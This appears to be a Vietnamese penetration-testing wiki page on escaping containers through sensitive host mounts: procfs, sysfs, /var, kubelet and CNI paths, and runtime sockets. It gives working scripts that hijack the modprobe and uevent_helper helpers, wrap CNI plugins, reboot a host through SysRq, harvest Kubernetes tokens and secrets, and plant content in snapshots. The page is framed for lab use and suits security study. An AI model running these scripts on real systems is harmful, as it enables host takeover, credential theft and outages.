# Các mount nhạy cảm của host

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Các mount của host là một trong những bề mặt container escape quan trọng nhất trên thực tế, vì chúng thường làm mất hiệu lực của chế độ xem tiến trình được cô lập cẩn thận và cho phép truy cập trực tiếp vào tài nguyên của host. Những trường hợp nguy hiểm không chỉ giới hạn ở `/`. Bind mount của `/proc`, `/sys`, `/var`, socket runtime, trạng thái do kubelet quản lý hoặc các đường dẫn liên quan đến thiết bị có thể làm lộ các cơ chế điều khiển kernel, thông tin xác thực, filesystem của các container lân cận và giao diện quản lý runtime.

Trang này được tách riêng khỏi các trang bảo vệ riêng lẻ vì mô hình lạm dụng có phạm vi rộng. Một host mount có quyền ghi nguy hiểm một phần do mount namespace, một phần do user namespace, một phần do phạm vi bao phủ của AppArmor hoặc SELinux, và một phần do chính xác đường dẫn host nào bị lộ. Xem đây là một chủ đề riêng giúp việc phân tích bề mặt tấn công dễ dàng hơn nhiều.

Ngoài ra, hãy so sánh một thư mục trên host có quyền ghi với đường dẫn tương ứng bên trong từng container. Nếu thư mục đó được mount đè lên một thư mục chứa các script khởi động có thể thực thi, người dùng host có đặc quyền thấp hơn có thể đặt mã mà entrypoint của container có đặc quyền cao hơn sẽ tải trong lần khởi động lại tiếp theo. Hãy xác nhận chính xác nguồn và đích của bind mount, quyền ghi/tìm kiếm trên thư mục, vòng lặp của entrypoint và yêu cầu về tệp thực thi, UID runtime và một tác nhân thực sự kích hoạt khởi động lại. UID 0 trong container không tự động là UID 0 trên host; ánh xạ user namespace và chính sách mount quyết định tác động trên host. Khi rà soát thụ động, chỉ nên báo cáo đường dẫn và quyền, không ghi script hoặc khởi động lại workload.

Một Linux container có thể nằm bên trong một VM quản lý chia sẻ một phần filesystem của một host Windows riêng. [Thư mục chia sẻ VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) là một cách khiến các tệp trên host hiển thị trong guest, nhưng root trong VM đó vẫn là một danh tính khác với quản trị viên Windows. Nếu thư mục chia sẻ làm lộ khóa SSH riêng của một người dùng mà có thể đọc được, hãy xem đó là đầu mối về thông tin xác thực: xác minh chính xác mount được ánh xạ từ host, quyền sở hữu và quyền truy cập của khóa, tài khoản tương ứng, cùng chính sách authorized-key **có hiệu lực** của SSH server trên Windows trước khi kết luận rằng khóa cho phép đăng nhập vào host. [OpenSSH trên Windows](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) hiện đại thường dùng tệp `administrators_authorized_keys` riêng cho các tài khoản quản trị viên. Không đưa nội dung khóa riêng vào đầu ra liệt kê thông thường; metadata về mount và đường dẫn khóa là đủ cho việc đánh giá thụ động ban đầu.

## Mức độ phơi lộ `/proc`

procfs chứa cả thông tin tiến trình thông thường lẫn các giao diện điều khiển kernel có tác động lớn. Vì vậy, một bind mount như `-v /proc:/host/proc` hoặc chế độ xem container làm lộ các mục proc có quyền ghi bất thường có thể dẫn đến rò rỉ thông tin, từ chối dịch vụ hoặc thực thi mã trực tiếp trên host.

Các đường dẫn procfs có giá trị cao bao gồm:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (đặc biệt là `register` và `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Lạm dụng

Bắt đầu bằng cách kiểm tra những mục procfs có giá trị cao nào đang hiển thị hoặc có quyền ghi:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Các path này đáng chú ý vì những lý do khác nhau. `core_pattern`, `modprobe` và `binfmt_misc` có thể trở thành đường dẫn thực thi code trên host khi có quyền ghi. `kallsyms`, `kmsg`, `kcore` và `config.gz` là những nguồn reconnaissance hữu ích cho việc khai thác kernel. `sched_debug` và `mountinfo` tiết lộ ngữ cảnh về process, cgroup và filesystem, có thể giúp tái dựng cấu trúc host từ bên trong container.

Giá trị thực tiễn của mỗi path khác nhau, và xem tất cả chúng như thể có cùng mức độ tác động sẽ khiến việc phân loại khó khăn hơn:

- `/proc/sys/kernel/core_pattern`
  Nếu có quyền ghi, đây là một trong những path procfs có tác động lớn nhất vì kernel sẽ thực thi một pipe handler sau khi xảy ra crash. Container có thể trỏ `core_pattern` đến payload được lưu trong overlay hoặc trong một host path đã mount để thường có được khả năng thực thi code trên host. Xem thêm [read-only-paths.md](protections/read-only-paths.md) để biết ví dụ riêng.
- `/proc/sys/kernel/modprobe`
  Path này kiểm soát userspace helper mà kernel sử dụng khi cần gọi logic nạp module. Nếu có thể ghi từ container và được diễn giải trong ngữ cảnh host, nó có thể trở thành một primitive thực thi code khác trên host. Path này đặc biệt đáng chú ý khi kết hợp với một cách kích hoạt helper.
- `/proc/sys/vm/panic_on_oom`
  Đây thường không phải là một primitive escape rõ ràng, nhưng có thể biến áp lực bộ nhớ thành denial of service trên toàn host bằng cách chuyển tình trạng OOM thành hành vi kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Nếu có quyền ghi vào interface đăng ký, attacker có thể đăng ký handler cho một magic value tùy chọn và có được khả năng thực thi trong ngữ cảnh host khi một file khớp được thực thi.
- `/proc/config.gz`
  Hữu ích cho việc phân loại kernel exploit. Nó giúp xác định những subsystem, mitigation và tính năng kernel tùy chọn nào được bật mà không cần metadata gói trên host.
- `/proc/sysrq-trigger`
  Chủ yếu là một path denial of service, nhưng rất nghiêm trọng. Nó có thể reboot, gây panic hoặc làm gián đoạn host ngay lập tức.
- `/proc/kmsg`
  Tiết lộ thông báo trong kernel ring buffer. Hữu ích cho việc fingerprint host, phân tích crash và trong một số môi trường, làm leak thông tin hỗ trợ khai thác kernel.
- `/proc/kallsyms`
  Có giá trị khi đọc được vì nó để lộ thông tin về các kernel symbol được export và có thể giúp vượt qua các giả định về address randomization trong quá trình phát triển kernel exploit.
- `/proc/[pid]/mem`
  Đây là một interface truy cập trực tiếp bộ nhớ process. Nếu có thể truy cập process mục tiêu với các điều kiện kiểu ptrace cần thiết, nó có thể cho phép đọc hoặc sửa đổi bộ nhớ của process khác. Tác động thực tế phụ thuộc nhiều vào credentials, `hidepid`, Yama và các hạn chế ptrace, vì vậy đây là một path mạnh nhưng có điều kiện.
- `/proc/kcore`
  Tiết lộ một góc nhìn kiểu core image về bộ nhớ hệ thống. File này rất lớn và khó sử dụng, nhưng nếu có thể đọc đáng kể thì đó là dấu hiệu cho thấy bề mặt bộ nhớ của host bị phơi lộ nghiêm trọng.
- `/dev/kmem` và `/dev/mem`
  Đây là các interface **device** truy cập bộ nhớ thô, có tác động lớn theo cách truyền thống, không phải file procfs. Trên nhiều hệ thống hiện đại, chúng không tồn tại hoặc bị hạn chế nghiêm ngặt, nhưng container có thể mở một bản sao được mount từ host thì nên xem mức độ phơi lộ này là nghiêm trọng. Hãy kiểm tra chúng cùng với các mount `/dev` nhạy cảm khác thay vì tìm các path `/proc/kmem` hoặc `/proc/mem` không tồn tại.
- `/proc/sched_debug`
  Làm leak thông tin về scheduling và task, có thể để lộ danh tính process trên host ngay cả khi các chế độ xem process khác trông có vẻ được bảo vệ tốt hơn dự kiến.
- `/proc/[pid]/mountinfo`
  Cực kỳ hữu ích để tái dựng vị trí thực sự của container trên host, xác định path nào được hỗ trợ bởi overlay và liệu một mount có quyền ghi trỏ đến nội dung trên host hay chỉ đến layer của container.

Nếu đọc được `/proc/[pid]/mountinfo` hoặc chi tiết overlay, hãy dùng chúng để tìm lại host path của filesystem container:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Các lệnh này hữu ích vì một số thủ thuật thực thi trên host đòi hỏi chuyển đổi một đường dẫn bên trong container thành đường dẫn tương ứng theo góc nhìn của host.

### Ví dụ: Chuẩn bị đường dẫn helper `modprobe`

Nếu có thể ghi vào `/proc/sys/kernel/modprobe` từ container và đường dẫn helper được diễn giải trong ngữ cảnh của host, đường dẫn này có thể được chuyển hướng đến payload do attacker kiểm soát. Thư mục upper của overlay phải được phân giải từ host, và kết quả chứng minh phải được ghi lại vào chính lớp container mà host nhìn thấy đó nếu container cũng không mount `/tmp` của host:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Trigger chính xác phụ thuộc vào mục tiêu và hành vi của kernel, nên cố ý không đoán trước. Khôi phục giá trị ban đầu trước khi rời lab. Điểm quan trọng là một đường dẫn helper có quyền ghi có thể chuyển hướng lần gọi helper trong tương lai của kernel đến nội dung trên đường dẫn host do attacker kiểm soát. `upperdir` của overlay bị thiếu, đường dẫn mà host không thể phân giải, mount sysctl chỉ đọc hoặc kernel không bao giờ gọi helper đã chọn đều làm đứt chuỗi này.

### Ví dụ đầy đủ: Trinh sát kernel với `kallsyms`, `kmsg` và `config.gz`

Nếu mục tiêu là đánh giá khả năng khai thác thay vì thoát ngay:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Các lệnh này giúp xác định liệu thông tin symbol hữu ích có hiển thị hay không, các thông điệp kernel gần đây có tiết lộ trạng thái đáng chú ý hay không, và những tính năng hoặc biện pháp giảm thiểu nào của kernel đã được biên dịch. Tác động thường không trực tiếp dẫn đến escape, nhưng có thể rút ngắn đáng kể quá trình phân loại lỗ hổng kernel.

### Ví dụ đầy đủ: Khởi động lại host bằng SysRq

Nếu có thể ghi vào `/proc/sysrq-trigger` và thao tác này tác động đến host:

```bash
echo b > /proc/sysrq-trigger
```

Tác động là máy chủ khởi động lại ngay lập tức. Đây không phải là ví dụ kín đáo, nhưng nó cho thấy rõ việc để lộ procfs có thể nghiêm trọng hơn nhiều so với rò rỉ thông tin.

## `/sys` Exposure

sysfs để lộ lượng lớn trạng thái kernel và thiết bị. Một số đường dẫn sysfs chủ yếu hữu ích cho fingerprinting, trong khi những đường dẫn khác có thể ảnh hưởng đến việc thực thi helper, hoạt động của thiết bị, cấu hình security module hoặc trạng thái firmware.

Các đường dẫn sysfs có giá trị cao gồm:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Các đường dẫn này quan trọng vì những lý do khác nhau. `/sys/class/thermal` có thể ảnh hưởng đến hoạt động quản lý nhiệt và do đó ảnh hưởng đến độ ổn định của máy chủ trong các môi trường bị để lộ không đúng cách. `/sys/kernel/vmcoreinfo` có thể làm rò rỉ thông tin về crash dump và bố cục kernel, hỗ trợ fingerprinting máy chủ ở mức thấp. `/sys/kernel/security` là giao diện `securityfs` được Linux Security Modules sử dụng, vì vậy quyền truy cập bất ngờ vào đây có thể làm lộ hoặc thay đổi trạng thái liên quan đến MAC. Các đường dẫn biến EFI có thể ảnh hưởng đến thiết lập khởi động được lưu trong firmware, khiến chúng nghiêm trọng hơn nhiều so với các tệp cấu hình thông thường. `debugfs` trong `/sys/kernel/debug` đặc biệt nguy hiểm vì đây vốn là giao diện dành cho nhà phát triển, với ít kỳ vọng về độ an toàn hơn nhiều so với các API kernel hướng đến môi trường production đã được harden.

Mọi mục sysfs trong danh sách này đều **phụ thuộc vào kernel, cấu hình và phần cứng**. Các node ảo hóa hiện nay thường hoàn toàn không có `uevent_helper`, biến EFI và mục thiết bị nhiệt. Hãy ghi nhận đường dẫn không tồn tại là một điều kiện tiên quyết không đáp ứng, thay vì cho rằng ví dụ từ kernel khác cũng áp dụng được.

Các lệnh hữu ích để rà soát những đường dẫn này là:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Điều gì khiến các lệnh đó đáng chú ý:

- `/sys/kernel/security` có thể cho biết liệu AppArmor, SELinux hoặc một LSM khác có đang hiển thị theo cách đáng ra chỉ host mới truy cập được hay không.
- `/sys/kernel/debug` thường là phát hiện đáng báo động nhất trong nhóm này. Nếu `debugfs` được mount và có thể đọc hoặc ghi, hãy dự kiến có một bề mặt rộng hướng tới kernel, với rủi ro cụ thể tùy thuộc vào các nút debug được bật.
- Việc lộ biến EFI ít phổ biến hơn, nhưng nếu có thì tác động rất lớn vì nó liên quan đến các cài đặt được lưu trong firmware, chứ không phải các tệp runtime thông thường.
- `/sys/class/thermal` chủ yếu liên quan đến độ ổn định của host và tương tác với phần cứng, không phải kiểu thoát container bằng shell.
- `/sys/kernel/vmcoreinfo` chủ yếu là nguồn để nhận diện host và phân tích sự cố crash, hữu ích để tìm hiểu trạng thái kernel ở mức thấp.

### Ví dụ đầy đủ: `uevent_helper`

`/sys/kernel/uevent_helper` phụ thuộc vào kernel và cấu hình, và không có trên nhiều hệ thống hiện nay. Nếu nó tồn tại, có thể ghi, và có trigger `uevent` khả dụng, kernel có thể thực thi một helper do attacker kiểm soát. Bằng chứng đầu ra phải sử dụng một đường dẫn hiển thị được từ cả host lẫn container:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Lý do cách này hoạt động là helper path được diễn giải theo góc nhìn của host. Khi được kích hoạt, helper chạy trong ngữ cảnh của host thay vì bên trong container hiện tại. `/sys/class/mem/null/uevent` là một trigger cụ thể trên các kernel có hỗ trợ; các thiết bị khác có thể có tệp `uevent` riêng, nhưng đừng chọn bừa trên phần cứng thực tế. Khôi phục giá trị ban đầu trước khi rời lab. Không báo cáo kỹ thuật này là khả dụng nếu không có tệp helper hoặc trigger có thể kiểm soát.

## `/var` Exposure

Việc mount `/var` của host vào container thường bị đánh giá thấp vì trông không nghiêm trọng như mount `/`. Trên thực tế, việc này có thể đủ để truy cập các runtime socket, thư mục snapshot của container, volume pod do kubelet quản lý, token tài khoản dịch vụ được chiếu vào pod và filesystem của các ứng dụng lân cận. Trên các node hiện đại, `/var` thường là nơi chứa trạng thái container có ý nghĩa vận hành nhất.

### Kubernetes Example

Một pod có `hostPath: /var` thường có thể đọc token được chiếu vào các pod khác và nội dung snapshot overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Các lệnh này hữu ích vì chúng giúp xác định mount chỉ để lộ dữ liệu ứng dụng ít quan trọng hay thông tin xác thực cluster có tác động lớn. Token service-account có thể đọc được có thể ngay lập tức biến việc thực thi mã cục bộ thành quyền truy cập Kubernetes API.

Nếu token tồn tại, hãy xác minh những gì token có thể truy cập thay vì chỉ dừng lại ở việc phát hiện token:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Tác động ở đây có thể lớn hơn nhiều so với việc chỉ truy cập node cục bộ. Một token có RBAC rộng có thể biến `/var` được mount thành sự cố xâm phạm toàn bộ cluster.

### Ví dụ về Docker và containerd

Trên các host Docker, dữ liệu liên quan thường nằm trong `/var/lib/docker`, còn trên các node Kubernetes dùng containerd, dữ liệu có thể nằm trong `/var/lib/containerd` hoặc các đường dẫn riêng của snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Nếu `/var` được mount và làm lộ nội dung snapshot có thể ghi của workload khác, kẻ tấn công có thể sửa đổi tệp ứng dụng, cài nội dung web hoặc thay đổi script khởi động mà không cần chạm đến cấu hình container hiện tại.

Trên một **workload lab dùng một lần**, nội dung snapshot có thể ghi cho thấy cách can thiệp ứng dụng, khôi phục secret hoặc di chuyển ngang. Trước tiên, hãy ánh xạ container ID của runtime đến đúng snapshot và tuyệt đối không chỉnh sửa snapshot không liên quan hoặc snapshot production:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Các lệnh này hữu ích vì cho thấy ba nhóm tác động chính của việc mount `/var`: can thiệp ứng dụng, thu thập bí mật và di chuyển ngang sang các workload lân cận.

Việc ghi trực tiếp vào snapshot bỏ qua cơ chế quản lý trạng thái thông thường của runtime, có thể làm hỏng container hoặc phá hủy bằng chứng. Hoạt động dò tìm chỉ đọc đã được tái hiện cục bộ trên Docker `overlay2`: một marker được ghi trong container tạm thời lân cận xuất hiện bên dưới `/var/lib/docker/overlay2/<id>/diff/`. Chỉ sửa đổi snapshot thực tế trong container tạm thời được tạo riêng cho thử nghiệm đó.

## Trạng thái Kubelet, plugin và các đường dẫn CNI

Mount `/var/lib/kubelet`, `/opt/cni/bin` hoặc `/etc/cni/net.d` thường được cung cấp thông qua DaemonSet có đặc quyền, tác nhân CNI, plugin nút CSI, toán tử GPU và các thành phần hỗ trợ lưu trữ. Những mount này dễ bị xem nhẹ như "hạ tầng kết nối của node", nhưng chúng nằm ngay trên đường thực thi của các pod mới và thường chứa thông tin xác thực kubelet, secret được chiếu vào, socket đăng ký và các binary plugin thực thi ở phía host.

Các mục tiêu có giá trị cao gồm:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Các lệnh kiểm tra hữu ích là:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Vì sao các đường dẫn này quan trọng:

- `/var/lib/kubelet/pki` có thể để lộ chứng chỉ client của kubelet và các thông tin xác thực khác chỉ tồn tại trên node, đôi khi có thể được dùng lại để truy cập API server hoặc các endpoint TLS mà kubelet cung cấp, tùy theo thiết kế của cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` thường chứa token service-account được chiếu vào và các Secret được mount cho những pod lân cận trên cùng node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` chủ yếu là bề mặt reconnaissance, nhưng rất hữu ích: nó cho biết pod và container nào hiện đang sử dụng GPU, hugepage, thiết bị SR-IOV và các tài nguyên khan hiếm khác chỉ có trên node.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` và `/var/lib/kubelet/plugins_registry` cho biết các plugin CSI, DRA và device nào được cài đặt, cũng như những socket mà kubelet dự kiến sẽ giao tiếp. Nếu các thư mục này có quyền ghi thay vì chỉ đọc, phát hiện này trở nên nghiêm trọng hơn nhiều.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` và `/etc/cni/net.d` nằm ngay trên đường thiết lập mạng pod. Quyền ghi tại đó thường là một primitive thực thi trên host có thể được khai thác sau đó, chứ không chỉ đơn thuần làm lộ cấu hình.<sup>[[2]](#references)</sup>

### Ví dụ đầy đủ: `/opt/cni/bin` có quyền ghi

Nếu một thư mục nhị phân CNI trên host được mount với quyền đọc-ghi, chỉ cần thay thế một plugin là có thể thực thi mã trên host vào lần tiếp theo kubelet tạo pod sandbox trên node đó:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Điều này không tức thời như một `docker.sock` được mount, nhưng thường thực tế hơn trong các pod hạ tầng Kubernetes đã bị xâm nhập. Marker được ghi bên cạnh plugin đã mount để container có thể truy xuất nó ngay cả khi không có mount host-root hoặc host-`/tmp`. Wrapper giữ nguyên các đối số ban đầu và đầu vào chuẩn, sau đó ví dụ khôi phục binary ban đầu. Điểm quan trọng là binary đã sửa đổi sẽ được thực thi sau đó bởi luồng thiết lập mạng của host, chứ không phải bởi container hiện tại. Chỉ sử dụng node dùng một lần vì wrapper không hợp lệ có thể khiến các Pod sandbox mới không được cấp mạng.

## Socket runtime

Các mount nhạy cảm trên host thường bao gồm socket runtime thay vì toàn bộ thư mục. Chúng quan trọng đến mức cần được nhắc lại rõ ràng ở đây:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Xem [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) để biết các luồng exploitation đầy đủ sau khi một trong các socket này được mount.

Một mẫu tương tác ban đầu nhanh:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Nếu một trong những cách này thành công, con đường từ "socket đã mount" đến "khởi chạy một container ngang hàng có nhiều đặc quyền hơn" thường ngắn hơn nhiều so với bất kỳ con đường thoát khỏi kernel nào.

Quyền truy cập daemon tương tự cũng có thể thiết lập **tính bền vững trên host**. Một container hỗ trợ có bind mount ghi được trỏ đến thư mục gốc của host có thể nhận tệp qua `docker cp`, sau đó dùng `docker exec` để đặt khóa SSH, service unit hoặc tệp duy trì quyền truy cập khác vào đường dẫn host đã mount. Ranh giới bảo mật nằm ở quyền của daemon trong việc tạo mount trên host; `docker cp` chỉ là bước trung chuyển. Hãy kiểm tra cả các container mới được tạo lẫn những lần ghi vào đường dẫn xác thực hoặc khởi động của host sau khi socket runtime bị lộ.

## Chiếm quyền tác vụ thông qua đường dẫn host có thể ghi

Một mount host có thể ghi không cần phải để lộ `/` mới nguy hiểm. Nếu đường dẫn được mount chứa script, tệp cấu hình, hook, plugin hoặc các tệp mà tác vụ hay dịch vụ chạy theo lịch phía host sẽ dùng sau đó, container có thể thay đổi nội dung mà host thực thi.

Quy trình rà soát tổng quát:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Nếu một tiến trình host sử dụng tệp có quyền ghi, hãy giữ payload đơn giản và dễ quan sát trong quá trình kiểm thử:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Phần đáng chú ý là ranh giới tin cậy: thao tác ghi diễn ra bên trong container, nhưng việc thực thi xảy ra sau đó trong ngữ cảnh của dịch vụ trên host. Điều này biến một hostPath hoặc bind mount phạm vi hẹp thành primitive thực thi mã trên host có độ trễ.

## Tệp do root sở hữu trên host path dùng chung

Một tài khoản trong container có thể trở thành root có thể đặt một tệp do root sở hữu trên một path có quyền ghi mà host cũng sử dụng. Nếu UID 0 trong container ánh xạ thành UID 0 trên host, cả hai góc nhìn đều trỏ đến cùng một tệp và host mount cho phép thực thi SUID, người dùng trên host có thể chạy một executable SUID do root sở hữu trên path đó và vượt qua ranh giới đặc quyền của host. Với vấn đề quyền sở hữu tệp cụ thể này, container không cần chạy với `--privileged`. Xem [ánh xạ user namespace](protections/namespaces/user-namespace.md) và [phần thảo luận về SUID](privileged-containers.md) để biết các điều kiện riêng biệt.

Kiểm tra path từ **cả hai phía**: so sánh quyền sở hữu và danh tính của một tệp vô hại, kiểm tra `uid_map` và `gid_map` của container, đồng thời xem xét các tùy chọn mount và chính sách thực thi trên host. `rw` ở phía container mà không có `nosuid` chỉ là một dấu hiệu cần kiểm tra; nó không thể xác nhận quyền sở hữu trên host, các cờ mount của host, quyền truy cập của người dùng trên host, hoặc liệu AppArmor/SELinux có chặn việc thực thi hay không. `noexec` giới hạn việc thực thi trong góc nhìn mà nó áp dụng. Các thẻ `shared:` và `master:` trong `/proc/self/mountinfo` mô tả sự lan truyền mount, chứ không cho biết nội dung tệp có được chia sẻ với host hay không. Một bind mount có thể không có các thẻ đó. Việc tái sử dụng thông tin xác thực để đăng nhập vào host là bước riêng, không liên quan đến ranh giới đặc quyền của tệp dùng chung.

Bộ lưu trữ của runtime trên host có thể tạo ra path tương tự ngay cả khi không có bind mount tường minh. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) cho phép người dùng không có đặc quyền trên host duyệt qua các thư mục con dữ liệu Docker và thực thi tệp từ filesystem của container; Moby đã sửa quyền trong phiên bản 20.10.9 và lưu ý rằng cần khởi động lại các container đang chạy để sửa các thư mục của chúng. Kiểm tra chính xác các path `overlay2/<id>/merged` đã mount và quyền tìm kiếm của từng thư mục cha, sau đó xác định xem UID 0 trong container có ánh xạ thành UID 0 trên host hay không, có executable SetUID thực sự do root sở hữu và có thể truy cập hay không, và góc nhìn trên host có cho phép thực thi SetUID hay không. Container rootless hoặc dùng user namespace-remapped, `nosuid`, `noexec`, `no_new_privs` và chính sách MAC có thể làm thay đổi kết quả. Phiên bản runtime hoặc path có thể duyệt qua chỉ là dấu hiệu để kiểm tra, không phải bằng chứng rằng có thể thực thi với quyền root trên host; hãy kiểm tra metadata của mount và tệp mà không chạy executable đáng ngờ.

## CVE liên quan đến mount

Mount trên host cũng có thể liên quan đến lỗ hổng runtime. Một số ví dụ đáng chú ý gần đây gồm:

- `CVE-2024-21626` trong `runc`, trong đó một file descriptor của thư mục bị leak có thể đặt thư mục làm việc trên filesystem của host.
- `CVE-2024-23651`, `CVE-2024-23652` và `CVE-2024-23653` trong BuildKit, trong đó Dockerfile, frontend độc hại và các luồng `RUN --mount` có thể làm xuất hiện lại quyền truy cập tệp trên host, xóa tệp hoặc nâng cao đặc quyền trong quá trình build.
- `CVE-2024-1753` trong các luồng build của Buildah và Podman, trong đó bind mount được tạo thủ công trong quá trình build có thể để lộ `/` với quyền đọc-ghi.
- `CVE-2025-47290` trong `containerd` 2.1.0, trong đó lỗi TOCTOU khi giải nén image có thể cho phép một image được tạo đặc biệt sửa đổi filesystem của host trong lúc pull.

Các CVE này liên quan ở đây vì chúng cho thấy xử lý mount không chỉ phụ thuộc vào cấu hình của operator. Bản thân runtime cũng có thể tạo ra các điều kiện thoát container do mount gây ra.

## Kiểm tra

Dùng các lệnh sau để nhanh chóng tìm các mount có mức độ phơi nhiễm cao nhất:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
